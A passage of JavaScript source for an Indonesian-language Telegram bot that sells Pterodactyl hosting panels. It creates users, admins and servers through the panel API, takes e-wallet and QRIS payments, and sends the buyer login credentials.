  const username = t[0];
  const u = t[1];
  const name = username + 'unli';
  const egg = settings.eggs;
  const loc = settings.loc;
  const nests = settings.nests;
  const memo = '0';
  const cpu = '0';
  const disk = '0';
  const email = `${username}@Relix.com`;
  const akunlo = settings.pp;
  const password = generateRandomPassword();
  let user;
  let server;
  try {
    const response = await fetch(`${domain}/api/application/users`, {
      method: 'POST',
      headers: {
        'Accept': 'application/json',
        'Content-Type': 'application/json',
        'Authorization': `Bearer ${plta}`
      },
      body: JSON.stringify({
        email: email,
        username: username,
        first_name: username,
        last_name: username,
        language: 'en',
        password: password
      })
    });
    const data = await response.json();
    if (data.errors) {
      if (data.errors[0].meta.rule === 'unique' && data.errors[0].meta.source_field === 'email') {
        bot.sendMessage(chatId, 'Email already exists. Please use a different email.');
      } else {
        bot.sendMessage(chatId, `Error: ${JSON.stringify(data.errors[0], null, 2)}`);
      }
      return;
    }
    user = data.attributes;
    const responses = await fetch(`${domain}/api/application/nests/${nests}/eggs/${egg}`, {
method: 'GET',
headers: {
'Accept': 'application/json',
'Content-Type': 'application/json',
'Authorization': `Bearer ${plta}`
}
})
const data4 = await responses.json();
const startup_cmd = data4.attributes.startup
    const response2 = await fetch(`${domain}/api/application/servers`, {
      method: 'POST',
      headers: {
        'Accept': 'application/json',
        'Content-Type': 'application/json',
        'Authorization': `Bearer ${plta}`
      },
      body: JSON.stringify({
        name: name,
        description: '',
        user: user.id,
        egg: parseInt(egg),
        docker_image: 'ghcr.io/parkervcp/yolks:nodejs_18',
        startup: startup_cmd,
        environment: {
          INST: 'npm',
          USER_UPLOAD: '0',
          AUTO_UPDATE: '0',
          CMD_RUN: 'npm start'
        },
        limits: {
          memory: memo,
          swap: 0,
          disk: disk,
          io: 500,
          cpu: cpu
        },
        feature_limits: {
          databases: 5,
          backups: 5,
          allocations: 0
        },
        deploy: {
          locations: [parseInt(loc)],
          dedicated_ip: false,
          port_range: []
        }
      })
    });
    const data2 = await response2.json();
    server = data2.attributes;
  } catch (error) {
    bot.sendMessage(chatId, `Error: ${error.message}`);
  }
  if (user && server) {
    bot.sendMessage(chatId, `BERIKUT DATA PANEL ANDA
ID: ${server.id}
NAMA: ${username}
EMAIL: ${email}
MEMORY: ${server.limits.memory === 0 ? 'unli' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'unli' : server.limits.disk} MB
CPU: ${server.limits.cpu}%`);
    if (akunlo) {
      bot.sendPhoto(u, akunlo, {
        caption: `Hai @${u}

HERE'S YOUR PANEL DATA ⤵️
🚩 Username : ${user.username}
🚩 Password : ${password}
🚩 Login : ${domain}  
==============================
Jangan Lupa Bilang Done Jika Sudah Di Cek
==============================
➡️ Rules : 

• Jangan Curi Sc
• Jangan Buka Panel Orang
• Jangan Ddos Server
• Kalo jualan sensor domainnya
• Jangan Bagi² Panel Free
• Jangan Jualan AdminP Kecuali Pt Gw !!
• Dilirang Keras Pasang Sc/Bot DDOS
==============================
THANKS FOR BUYING AT RelixOfficial😁✌ ` 
        });
      bot.sendMessage(chatId, 'Data panel berhasil dikirim ke ID Telegram yang dimaksud.');
    }
  } else {
    bot.sendMessage(chatId, 'Gagal membuat data panel. Silakan coba lagi.');
  }
});
//batas

//▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰//
// createadmin
bot.onText(/\/createadmin (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;


  if (userId != adminId) {
    bot.sendMessage(chatId, 'Perintah Hanya Untuk Owner...');
    return;
  }
  const commandParams = match[1].split(',');
  const panelName = commandParams[0].trim();
  const telegramId = commandParams[1].trim();
 /* if (commandParams.length < 2) {
    bot.sendMessage(chatId, 'Format Salah! Penggunaan: /createadmin namapanel,idtele');
    return;
  }*/
   if (match === '' ) {
    bot.sendMessage(chatId, 'Format Salah! Penggunaan: /createadmin namapanel,idtele');
    return;
  }
  let password = require("crypto").randomBytes(5).toString("hex");
  
  try {
    const response = await fetch(`${domain}/api/application/users`, {
      method: 'POST',
      headers: {
        'Accept': 'application/json',
        'Content-Type': 'application/json',
        'Authorization': `Bearer ${plta}`
      },
      body: JSON.stringify({
        email: `${panelName}@Relix.com`,
        username: panelName,
        first_name: panelName,
        last_name: "Adm",
        language: "en",
        root_admin: true,
        password: password
      })
    });
    const data = await response.json();
    if (data.errors) {
      bot.sendMessage(chatId, JSON.stringify(data.errors[0], null, 2));
      return;
    }
    const user = data.attributes;
    const userInfo = `
TYPE: user
➟ ID: ${user.id}
➟ USERNAME: ${user.username}
➟ EMAIL: ${user.email}
➟ NAME: ${user.first_name} ${user.last_name}
➟ LANGUAGE: ${user.language}
➟ ADMIN: ${user.root_admin}
➟ CREATED AT: ${user.created_at}
    `;
    bot.sendMessage(chatId, userInfo);
    bot.sendMessage(telegramId, ` Hai @${telegramId}
    
╭──❏「 INFO DATA ADMIN PANEL 」❏
┃➥  Login : ${domain}
┃➥  Username : ${user.username}
┃➥  Password : ${password} 
┗━━━━━[ RelixOffc ]━━━━
➡️ Rules : 
• Jangan Curi Sc
• Jangan Buka Panel Orang
• Jangan Ddos Server
• Kalo jualan sensor domainnya
• Jangan Bagi² Panel Free
• Jangan Jualan AdminP Kecuali Pt Gw !!

NGEYEL? KICK NO REFF NO DRAMA
Jangan Lupa Bilang Done Jika Sudah Di Cek
==============================
THANKS FOR BUYING AT RelixOfficial😁✌️
    `);
  } catch (error) {
    console.error(error);
    bot.sendMessage(chatId, 'Terjadi kesalahan dalam pembuatan admin. Silakan coba lagi nanti.');
  }
});

//▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰//
// listsrv
bot.onText(/\/listsrv/, async (msg) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;   
    
// Check if the user is the Owner
    
    if (userId != adminId) {
        bot.sendMessage(chatId, 'Perintah Hanya Untuk Owner.', {
            reply_markup: {
                inline_keyboard: [
                    [
                        { text: 'HUBUNGI ADMIN', url: 'https://t.me/Oficiallz' }
                    ]
                ]
            }
        });
        return;
    }
    let page = 1; // Mengubah penggunaan args[0] yang tidak didefinisikan sebelumnya
    try {
        let f = await fetch(`${domain}/api/application/servers?page=${page}`, { // Menggunakan backticks untuk string literal
            method: 'GET',
            headers: {
                'Accept': 'application/json',
                'Content-Type': 'application/json',
                'Authorization': `Bearer ${plta}`
            }
        });
        let res = await f.json();
        let servers = res.data;
        let messageText = "Daftar server aktif yang dimiliki:\n\n";
        for (let server of servers) {
            let s = server.attributes;

            let f3 = await fetch(`${domain}/api/client/servers/${s.uuid.split('-')[0]}/resources`, {
                method: 'GET',
                headers: {
                    'Accept': 'application/json',
                    'Content-Type': 'application/json',
                    'Authorization': `Bearer ${pltc}`
                }
            });
            let data = await f3.json();
            let status = data.attributes ? data.attributes.current_state : s.status;
            let ident = `${s.identifier}`;

            messageText += `ID Server: ${s.id}\n`;
            messageText += `Identifier Server: ${s.identifier}\n`; `"+id+"`
            messageText += `Nama Server: ${s.name}\n`;
            messageText += `Status: ${status}\n\n`;
        }

        bot.sendMessage(chatId, messageText);
    } catch (error) {
        console.error(error);
        bot.sendMessage(chatId, 'Terjadi kesalahan dalam memproses permintaan.');
    }
});


bot.onText(/\/listadmin/, async (msg) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    
    if (userId != adminId) {
        bot.sendMessage(chatId, 'Perintah Hanya Untuk ', {
            reply_markup: {
                inline_keyboard: [
                    [
                        { text: 'HUBUNGI ADMIN', url: 'https://t.me/Oficiallz' }
                    ]
                ]
            }
        });
        return;
    }
    let page = '1';
    try {
        let f = await fetch(`${domain}/api/application/users?page=${page}`, {
            method: 'GET',
            headers: {
                'Accept': 'application/json',
                'Content-Type': 'application/json',
                'Authorization': `Bearer ${plta}`
            }
        });
        let res = await f.json();
        let users = res.data;
        let messageText = "Berikut list admin :\n\n";
        for (let user of users) {
            let u = user.attributes;
            if (u.root_admin) {
                messageText += `🆔 ID: ${u.id} - 🌟 Status: ${u.attributes?.user?.server_limit === null ? 'Inactive' : 'Active'}\n`;
                messageText += `${u.username}\n`;
                messageText += `${u.first_name} ${u.last_name}\n\n`;
                messageText += 'By Relix';
            }
        }
        messageText += `Page: ${res.meta.pagination.current_page}/${res.meta.pagination.total_pages}\n`;
        messageText += `Total Admin: ${res.meta.pagination.count}`;
        const keyboard = [
            [
                { text: 'BACK', callback_data: JSON.stringify({ action: 'back', page: parseInt(res.meta.pagination.current_page) - 1 }) },
                { text: 'NEXT', callback_data: JSON.stringify({ action: 'next', page: parseInt(res.meta.pagination.current_page) + 1 }) }
            ]
        ];
        bot.sendMessage(chatId, messageText, {
            reply_markup: {
                inline_keyboard: keyboard
            }
        });
   } catch (err) {
   console.log(err);
   }
})

bot.onText(/\/addsrv (.+)/, async (msg, match) => {
    const text = match[1];
    const chatId = msg.chat.id;
    const userId = msg.from.id; // Get user ID
    const userData = getUserData(userId);
    
     if (!userData.isReseller && !userData.isAdminReseller) {
        bot.sendMessage(chatId, 'Perintah Hanya Untuk Pengguna Premium.', {
            reply_markup: {
                inline_keyboard: [
                    [
                        { text: 'HUBUNGI ADMIN', url: 'https://t.me/Oficiallz' }
                    ]
                ]
            }
        });
        return;
    }
let s = text.split(',');
if (s.length < 5) {
bot.sendMessage(chatId, `*Format salah!*

Penggunaan:
/addsrv name,userId,locationId,memory/disk,cpu`)
return
}
let name = s[0];
let desc = '';
let usr_id = s[1];
let egg = settings.eggs;
let loc = s[2];
let memo_disk = s[3].split`/`;
let cpu = s[4];
let nests = settings.nests;
let f1 = await fetch(`${domain}/api/application/nests/${nests}/eggs/${egg}`, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": `Bearer ${plta}`
}
})
let data = await f1.json();
let startup_cmd = data.attributes.startup

let f = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": `Bearer ${plta}`,
},
"body": JSON.stringify({
"name": name,
"description": desc,
"user": usr_id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo_disk[0],
"swap": 0,
"disk": memo_disk[1],
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f.json()
if (res.errors) return reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
await delay(700)
bot.sendMessage(chatId, `*SUCCESSFULLY ADD SERVER*

TYPE: ${res.object}

ID: ${server.id}
UUID: ${server.uuid}
NAME: ${server.name}
DESCRIPTION: ${server.description}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%
CREATED AT: ${server.created_at}`)
})

bot.onText(/\/delsrv (.+)/, async (msg, match) => {
    const chatId = msg.chat.id;
    const srv = match[1].trim();
   const userId = msg.from.id;
   
if (userId != adminId) {
        bot.sendMessage(chatId, 'Perintah Hanya Untuk Owner, Hubungi Admin Saya Untuk Menjadi Owner atau Users Premium...', {
            reply_markup: {
                inline_keyboard: [
                    [
                        { text: 'HUBUNGI ADMIN', url: 'https://t.me/Oficiallz' }
                    ]
                ]
            }
        });
        return;
    }

    if (!srv) {
        bot.sendMessage(chatId, 'Mohon masukkan ID server yang ingin dihapus, contoh: /delsrv 1234');
        return;
    }

    try {
        let f = await fetch(`${domain}/api/application/servers/${srv}`, {
            method: 'DELETE',
            headers: {
                'Accept': 'application/json',
                'Content-Type': 'application/json',
                'Authorization': `Bearer ${plta}`
            }
        });

        let res = f.ok ? { errors: null } : await f.json();

        if (res.errors) {
            bot.sendMessage(chatId, 'SERVER NOT FOUND');
        } else {
            bot.sendMessage(chatId, 'SUCCESSFULLY DELETE THE SERVER');
        }
    } catch (error) {
        console.error(error);
        bot.sendMessage(chatId, 'Terjadi kesalahan saat menghapus server.');
    }
});

//==============================================




// Handler untuk semua command order
Object.keys(pkg1).forEach(pkg => {
  bot.onText(new RegExp(`\/order_${pkg}`), async (msg) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    
    if (fs.existsSync(`./database/gateway/${userId}.json`)) {
         const idTrx = getData(userId, "id"); 
         const amount = getData(userId, "amount"); 
         const expiredTime = getData(userId, "expired"); 
           await bot.sendMessage(chatId,
        `⚠️ 𝗣𝗘𝗡𝗗𝗜𝗡𝗚 𝗧𝗥𝗔𝗡𝗦𝗔𝗞𝗦𝗜  
▰▰▰▰▰▰▰▰▰▰▰  
🆔 *Invoice ID*: \`#${idTrx}\`
💸 *Harga*: ${amount}  
🕒 *Expired Dalam*: ${expiredTime}  

🔴 𝗣𝗲𝗿𝗶𝗻𝗴𝗮𝘁𝗮𝗻:  
Transaksi akan dibatalkan otomatis jika tidak diselesaikan sampai waktu yang di tentukan!  
 `, {
            reply_markup: {
                inline_keyboard: [
                    [{ text: '❌ Batal Beli ❌', callback_data: `payment_cancel_${idTrx}` }],
                ]
            },
            parse_mode: "Markdown"
        });
      
      
      return;
    }

    userPackages.set(chatId, pkg1[pkg]);
    orderType.set(chatId, `${pkg1[pkg].type}`);
    
    const paymentOptions = {
      reply_markup: {
        inline_keyboard: [
          [{ text: "Qris", callback_data: "payment_qris" }],
          [{ text: "Dana", callback_data: "payment_dana" }],
          [
            { text: "ShopeePay", callback_data: "payment_shopeepay" },
            { text: "LinkAja", callback_data: "payment_linkaja" }
          ],
          [{ text: "Batal", callback_data: "payment_batal" }],
        ],
      },
    };
    
    await bot.sendMessage(
      chatId,
      `Pilih metode pembayaran untuk Paket ${pkg.toUpperCase()} (${toRupiah(pkg1[pkg].price)}):`,
      paymentOptions
    );
  });
});

bot.on("callback_query", async (callbackQuery) => {
  const chatId = callbackQuery.message.chat.id;
  const userId = callbackQuery.from.id;
  const usernameAkun = callbackQuery.from.username;
  const msgId = callbackQuery.message.message_id;
  const data = callbackQuery.data;
  const type = orderType.get(chatId);
  const hariini = getCurrentTime();
  const filePay = path.join(__dirname, './database/gateway', `${userId}.json`);
  
  try {
    if (data.startsWith("payment_cancel_")) {
      const paymentId = data.split("_")[2];
      const interval = paymentIntervals.get(paymentId);
      if (interval) {
        clearInterval(interval);
        paymentIntervals.delete(paymentId);
      }
      await bot.deleteMessage(chatId, msgId);
      
      fs.unlinkSync(filePay)
      await bot.sendMessage(chatId, "❌ Transaksi dibatalkan");
      return;
    }

    if (data === "payment_batal") {
      await bot.deleteMessage(chatId, msgId);
      bot.sendMessage(chatId, "Berhasil Membatalkan");
    } else if (data.startsWith("payment_")) {
      const method = data.split("_")[1];
      let paymentMethod;

      switch (method) {
        case "qris": paymentMethod = "qrisfast"; break;
        case "dana": paymentMethod = "dana"; break;
        case "shopeepay": paymentMethod = "shopeepay"; break;
        case "linkaja": paymentMethod = "linkaja"; break;
        default: paymentMethod = "unknown";
      }
      
      const usernameOptions = {
    reply_markup: {
      inline_keyboard: [
        [{ text: "Batal", callback_data: "payment_batal" }]
      ]}
  };
    
      if (paymentMethod !== "unknown") {
        if (type == 'panel') {
        userPaymentMethods.set(chatId, paymentMethod);
        await bot.deleteMessage(chatId, msgId);
        await bot.sendMessage(chatId, "Masukan username:", usernameOptions);
        
        userStates.set(chatId, "awaiting_username");
        } else {
        userPaymentMethods.set(chatId, paymentMethod);
        await bot.deleteMessage(chatId, msgId);
        }
      }
    }
    await bot.answerCallbackQuery(callbackQuery.id);
    
    const handleScript = require('./lib/handleScript.js');
    await handleScript(
    bot, 
    chatId, 
    userId,
    callbackQuery.from.username,
    type,
    isProcessing,
    hariini,
    userPackages,
    Atlantic,
    userPaymentMethods,
    orderType,
    paymentIntervals,
    toRupiah,
    () => hariini );
   
  } catch (error) {
    console.error("Callback error:", error);
  }
});


bot.on("message", async (msg) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const usernameAkun = msg.from.username;
  const text = msg.text;
  const hariini = getCurrentTime();
  const type = orderType.get(chatId);

if ( type === 'panel' ) {
  if (userStates.get(chatId) === "awaiting_username" && !text.startsWith("/")) {
    try {
      userUsernames.set(chatId, text);
      userStates.delete(chatId);
      
      const filePay = path.join(__dirname, './database/gateway', `${userId}.json`);
      const packageInfo = userPackages.get(chatId);
      const { memo, cpu, price, level, item } = packageInfo;
      const paymentMethod = userPaymentMethods.get(chatId);
      const name = userUsernames.get(chatId);
        let user;
        let psswd = require("crypto").randomBytes(5).toString("hex");

              // Buat user
              const userRes = await fetch(`${domain}/api/application/users`, {
                method: "POST",
                headers: {
                  Accept: "application/json",
                  "Content-Type": "application/json",
                  Authorization: `Bearer ${plta}`,
                },
                body: JSON.stringify({
                  email: `${name.replace(" ", "").toLowerCase()}@store.rlx`,
                  username: name.replace(" ", "").toLowerCase(),
                  first_name: name.replace(" ", ""),
                  last_name: "Memb",
                  language: "en",
                  password: psswd,
                }),
              });

              const userData = await userRes.json();

              if (userData.errors) {
                if (
                  userData.errors[0].meta.rule === "unique" &&
                  userData.errors[0].meta.source_field === "email"
                ) {
                  await bot.sendMessage(
                    chatId,
                    "Username sudah digunakan, coba username lain."
                  );
                  return;
                } else {
                  bot.sendMessage(
                    chatId,
                    `Error: ${JSON.stringify(userData.errors[0], null, 2)}`
                  );
                }
                return;
              }
              user = userData.attributes;
              
              
      const reff = `REFF-${userId}R${Date.now()}`;
      const atlantic = new Atlantic(userId);
      const res = await atlantic.createPayment(price, reff, paymentMethod);

      if (!res.status) {
        await bot.sendMessage(chatId, `❌ Terjadi Kesalahan Tolong Coba Lagi Dalam Beberapa Saat\n\nMessage: ${res.msg}`);
        return;
      }

      const expiredTime = moment.tz(res.data.expired_at, "YYYY-MM-DD HH:mm:ss", "Asia/Jakarta")
  .format("DD MMM YYYY HH:mm:ss");
        
      // Tampilkan sesuai metode
      let message;
      let object_buy = {
        ids: userId,
        id: res.data.id,
        expired: expiredTime,
        amount: `${toRupiah(res.data.amount)}`
      }
     
     
      if (paymentMethod === "qrisfast") {
       fs.writeFile(filePay, JSON.stringify(object_buy, null, 3), async (err) => {
       if (err) {
            console.error("Gagal menyimpan file:", err);
          return;
       }

    // Setelah file tersimpan, kirim gambar QR
    try {
        message = await bot.sendPhoto(chatId, res.data.qr_image, {
            caption:
            `▗▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▖\n` +
            `  🟢 𝗤𝗥𝗜𝗦 𝗣𝗔𝗬𝗠𝗘𝗡𝗧 𝗜𝗡𝗩𝗢𝗜𝗖𝗘   \n` +
            `▝▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▘\n` +
            `◈ ◈ ◈ ◈ ◈ ◈ ◈ ◈ ◈ ◈ ◈ ◈\n\n` +
            `📛 𝗔𝗰𝗰𝗼𝘂𝗻𝘁 𝗜𝗗: ${userId}\n` +
            `⌛ 𝗘𝘅𝗽𝗶𝗿𝗲 𝗶𝗻: [ ${expiredTime} ] \n\n` +
            `◈ ◈ ◈ ◈ ◈ ◈ ◈ ◈ ◈ ◈ ◈ ◈\n\n` +
            `💳 𝗧𝗿𝗮𝗻𝘀𝗮𝗸𝘀𝗶 𝗗𝗲𝘁𝗮𝗶𝗹:\n` +
            `┌─・📇 𝗜𝗻𝘃𝗼𝗶𝗰𝗲 𝗜𝗗: ${res.data.id}\n` +
            `├─・🛍️ ️𝗜𝘁𝗲𝗺: ${item}\n` +
            `├─・💸 𝗧𝗼𝘁𝗮𝗹: ${toRupiah(res.data.amount)}\n` +
            `└─・📌 𝗦𝘁𝗮𝘁𝘂𝘀: 𝙋𝙖𝙮𝙢𝙚𝙣𝙩 𝙋𝙚𝙣𝙙𝙞𝙣𝙜\n\n` +
            `⚠️ 𝗪𝗔𝗥𝗡𝗜𝗡𝗚:\n` +
            `• QRIS akan expired otomatis setelah waktu habis\n` +
            `• QRIS ini hanya berlaku untuk 1 kali pembayaran\n` +
            `• Pastikan membayar sebelum [ ${expiredTime} ]\n\n` +
            `💡 𝗖𝗮𝗿𝗮 𝗕𝗮𝘆𝗮𝗿::\n` +
            `1. Buka aplikasi e-wallet/mobile banking\n` +
            `2. Pilih menu "Scan QRIS"\n` +
            `3. Arahkan kamera ke QR di atas\n` +
            `4. Konfirmasi jumlah pembayaran\n\n` +
            `🔄 𝗦𝘁𝗮𝘁𝘂𝘀 𝗢𝘁𝗼𝗺𝗮𝘁𝗶𝘀:\n` +
            `• Sistem akan otomatis verifikasi dalam 2 detik\n` +
            `• Notifikasi instan saat berhasil\n` +
            `• Screenshot bukti transfer jika diperlukan`,
            reply_markup: {
                inline_keyboard: [
                    [
                        {
                            text: "❌ Batal Beli ❌",
                            callback_data: `payment_cancel_${res.data.id}`,
                        },
                    ],
                    [{ text: '📞 Bantuan', callback_data: 'support' }],
                ],
            },
        });
    } catch (error) {
    console.error("Gagal mengirim foto:", error);
        await bot.sendMessage(chatId, `Gagal mengirim foto: ${error}`);
    }
});
        
      } else {
      fs.writeFile(filePay, JSON.stringify(object_buy, null, 3), async (err) => {
    if (err) {
        console.error("Gagal menyimpan file:", err);
        return;
    }

    try {
        message = await bot.sendMessage(chatId, ` ▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂\n` +
            ` 📱 𝗣𝗔𝗬𝗠𝗘𝗡𝗧 𝗜𝗡𝗩𝗢𝗜𝗖𝗘 \n` +
            `▝▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀\n` +
            `◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈\n\n` +
            `📛 𝗔𝗰𝗰𝗼𝘂𝗻𝘁 𝗜𝗗: @${userId}\n` +
            `⏳ 𝗘𝘅𝗽𝗶𝗿𝗲𝗱: [ ${expiredTime} ] \n\n` +
            `◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈\n\n` +
            `💳 𝗧𝗿𝗮𝗻𝘀𝗮𝗸𝘀𝗶 𝗗𝗲𝘁𝗮𝗶𝗹:\n` +
            `┌─・📇 𝗜𝗻𝘃𝗼𝗶𝗰𝗲 𝗜𝗗: #${res.data.id}\n` +
            `├─・📲 𝗣𝗲𝗺𝗯𝗮𝘆𝗮𝗿𝗮𝗻: ${paymentMethod.toUpperCase()}\n` +
            `├─・🛍️ ️𝗜𝘁𝗲𝗺: ${item}\n` +
            `├─・💸 𝗧𝗼𝘁𝗮𝗹: 𝗥𝗽 ${toRupiah(res.data.amount)}\n` +
            `└─・📌 𝗦𝘁𝗮𝘁𝘂𝘀: 𝙒𝙖𝙞𝙩𝙞𝙣𝙜 𝙋𝙖𝙮𝙢𝙚𝙣𝙩\n\n` +
            `⚠️ 𝗣𝗘𝗡𝗜𝗡𝗚𝗔𝗧𝗔𝗡:\n` +
            `• Batas waktu transfer 1x24 jam\n` +
            `• Transaksi ini hanya berlaku untuk 1 kali pembayaran\n` +
            `• Pastikan membayar sebelum [ ${expiredTime} ]\n\n` +
            `💡 𝗖𝗮𝗿𝗮 𝗕𝗮𝘆𝗮𝗿:\n` +
            `1. Pastikan anda sudah memiliki aplikasi yang sama dengan Metode Pembayaran\n` +
            `2. Klik tombol ( Bayar Sekarang ) di bawah\n` +
            `3. Konfirmasi pin\n` +
            `4. Konfirmasi pembayaran\n\n` +
            `🔄 𝗦𝘁𝗮𝘁𝘂𝘀 𝗢𝘁𝗼𝗺𝗮𝘁𝗶𝘀:\n` +
            `• Sistem verifikasi otomatis 24/7\n` +
            `• Notifikasi instan saat berhasil\n` +
            `• Screenshoot bukti transfer jika perlu\n\n` +
            `▞▞▞▞▞▞▞▞▞▞▞▞▞▞▞▞▞▞▞▞▞▞▞▞\n` +
            `🚀 Klik Tombol Pembayaran Untuk Membayar Invoice`,
          {
            reply_markup: {
               inline_keyboard: [
                [
                    { text: "Bayar Sekarang ✔️", url: `${res.data.url}` }
                ],
                [
                    { text: "❌ Batal Beli ❌", callback_data: `payment_cancel_${res.data.id}` }
                ],
                [{ text: '📞 Bantuan', callback_data: 'support' }]
              ]
            }
          }
        );
          } catch (error) {
        console.error("Gagal mengirim foto:", error);
    }
        });
      }

const expiredMoment = moment.tz(res.data.expired_at, "YYYY-MM-DD HH:mm:ss", "Asia/Jakarta");
const createdMoment = moment.tz(res.data.created_at, "YYYY-MM-DD HH:mm:ss", "Asia/Jakarta");

if (!expiredMoment.isValid() || !createdMoment.isValid()) {
  await bot.sendMessage(chatId, "❌ Format waktu pembayaran tidak valid.");
  return;
}

const expiration = expiredMoment.valueOf(); // dalam milidetik
const created = createdMoment.valueOf();
const batasWaktu = expiration - created; // Durasi waktu pembayaran (ms)

if (batasWaktu <= 0) {
  console.log("Error: Waktu kedaluwarsa lebih kecil dari waktu dibuat.");
  return;
}

const checkInterval = setInterval(async () => {

  try {
    const now = moment.tz("Asia/Jakarta").valueOf(); // waktu sekarang

    if (created + batasWaktu < now) {
          clearInterval(checkInterval);
          paymentIntervals.delete(res.data.id);
          try {
            await delUsers(user.id);
            fs.unlinkSync(filePay)
            await bot.deleteMessage(chatId, message.message_id);
          } catch (error) {
            console.log(`QR message sudah terhapus\nMessage: ` + error);
          } 
          await bot.sendMessage(chatId, "⌛ Waktu pembayaran telah habis!");
          return;
        }
          
          const check = await atlantic.checkPayment(res.data.id);
          if (check.status) {
            clearInterval(checkInterval);
            fs.unlinkSync(filePay)
            
            await bot.deleteMessage(chatId, message.message_id);
            paymentIntervals.delete(res.data.id);
            await bot.sendMessage(
              settings.adminId,
              `✅ Pembayaran Berhasil\n\n` +
              `Detail User\n` +
                ` • User Id: ${userId}\n` +
                ` • Username: @${usernameAkun}\n\n` +
                `Detail Pembelian\n` +
                ` • ID: ${res.data.id}\n` +
                ` • Username: ${name}\n` +
                ` • Hari: ${hariini}\n` +
                ` • Metode Pembayaran: ${paymentMethod}\n` +
                ` • Item: ${item}` );

            let egg = settings.eggs;
            let loc = settings.loc;
            let nests = settings.nests;
            let server;

            try {
              const responses = await fetch(
                `${domain}/api/application/nests/${nests}/eggs/${egg}`,
                {
                  method: "GET",
                  headers: {
                    Accept: "application/json",
                    "Content-Type": "application/json",
                    Authorization: `Bearer ${plta}`,
                  },
                }
              );
              const data4 = await responses.json();
              const startup_cmd = data4.attributes.startup;
              // Buat server
              const serverRes = await fetch(
                `${domain}/api/application/servers`,
                {
                  method: "POST",
                  headers: {
                    Accept: "application/json",
                    "Content-Type": "application/json",
                    Authorization: `Bearer ${plta}`,
                  },
                  body: JSON.stringify({
                    name: name,
                    description: hariini,
                    user: user.id,
                    egg: parseInt(egg),
                    docker_image: "ghcr.io/parkervcp/yolks:nodejs_18",
                    startup: startup_cmd,
                    environment: {
                      INST: "npm",
                      USER_UPLOAD: "0",
                      AUTO_UPDATE: "0",
                      CMD_RUN: "npm start",
                    },
                    limits: {
                      memory: memo,
                      swap: 0,
                      disk: memo,
                      io: 500,
                      cpu: cpu,
                    },
                    feature_limits: {
                      databases: 1,
                      backups: 1,
                      allocations: 0,
                    },
                    deploy: {
                      locations: [parseInt(loc)],
                      dedicated_ip: false,
                      port_range: [],
                    },
                  }),
                }
              );

              const serverData = await serverRes.json();
              server = serverData.attributes;
              if (serverData.errors) {
                console.log("Error membuat server:", serverData.errors);
                await bot.sendMessage(
                  chatId,
                  `Terjadi kesalahan saat membuat server. \n${serverData}`
                );
                return;
              }
              if (user && server) {

                  bot.sendMessage(chatId, `
▛▀▀▀ PAYMENT SUCCESSFUL ▀▀▀▜
  ✅ 𝗣𝗘𝗠𝗕𝗔𝗬𝗔𝗥𝗔𝗡 𝗕𝗘𝗥𝗛𝗔𝗦𝗜𝗟
▙▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▟

◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈

💎 𝗧𝗿𝗮𝗻𝘀𝗮𝗸𝘀𝗶 𝗧𝗲𝗿𝘃𝗲𝗿𝗶𝗳𝗶𝗸𝗮𝘀𝗶
┌─・📇 𝗜𝗻𝘃𝗼𝗶𝗰𝗲 𝗜𝗗: \`${res.data.id}\`  
├─・👤 𝗨𝘀𝗲𝗿: @${usernameAkun}
├─・💳 𝗠𝗲𝘁𝗼𝗱𝗲: ${paymentMethod.toUpperCase()}
├─・💰 𝗧𝗼𝘁𝗮𝗹: ${toRupiah(res.data.amount)}
└─・📅 𝗧𝗶𝗺𝗲𝘀𝘁𝗮𝗺𝗽: ${hariini}

◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈

🖥 𝗗𝗲𝘁𝗮𝗶𝗹 𝗟𝗮𝘆𝗮𝗻𝗮𝗻
┌─・🎮 𝗧𝘆𝗽𝗲: Server Panel Bot
├─・📦 𝗣𝗮𝗸𝗲𝘁: ${level} Package
└─・⏳ 𝗗𝘂𝗿𝗮𝘀𝗶: 30 Hari

◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈

📥 𝗔𝗸𝘀𝗲𝘀 𝗦𝗲𝗿𝘃𝗲𝗿:
• *Username*: \`${user.username}\`  
• *Password*: \`${psswd}\`  
• *Panel URL*: ${domain}
Credentials Terkirim via DM

⚠️ 𝗣𝗲𝗻𝘁𝗶𝗻𝗴:
• Jangan DDOS Server
• Dilirang Keras membagikan link panel
• Jika Terjadi Error/Mokad Sebelum 30Hari Hubungi Admin
• Admin Tidak Bertanggung Jawab Jika Data Panel Hilang
• Simpan invoice ini sebagai bukti transaksi

